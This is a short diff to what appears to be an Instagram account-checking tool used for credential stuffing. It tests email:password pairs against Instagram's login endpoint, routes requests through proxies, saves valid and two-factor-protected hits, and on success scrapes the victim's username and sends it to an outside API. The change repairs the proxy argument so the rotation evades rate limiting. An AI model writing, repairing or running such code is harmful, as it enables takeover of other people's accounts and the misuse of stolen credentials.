@@ -30,7 +30,7 @@ def check(email:str,password:str):
 
         try:
             with Session() as s:
-                response = s.post("https://www.instagram.com/accounts/login/ajax/",data=data,headers=headers,proxy=proxy_set,timeout=Checker.timeout)
+                response = s.post("https://www.instagram.com/accounts/login/ajax/",data=data,headers=headers,proxies=proxy_set,timeout=Checker.timeout)
                 if "\"authenticated\":false" in response.text:
                     retries += 1
                 elif "\"user\":false" in response.text or "\"two_factor_required\":true" in response.text or "\"checkpoint_required\"" in response.text:
@@ -41,7 +41,7 @@ def check(email:str,password:str):
                     save("Instagram","custom",Checker.time,email+":"+password)
                     return
                 elif "\"authenticated\":true" in response.text:
-                    username = s.get("https://www.instagram.com/accounts/edit/",proxy=proxy_set,timeout=Checker.timeout).text.split("\"username\":\"")[1].split("\",\"")[0]
+                    username = s.get("https://www.instagram.com/accounts/edit/",proxies=proxy_set,timeout=Checker.timeout).text.split("\"username\":\"")[1].split("\",\"")[0]
 
                     data = get(f"https://soud.me/api/Instagram?username={username}",timeout=Checker.timeout).json()
                     
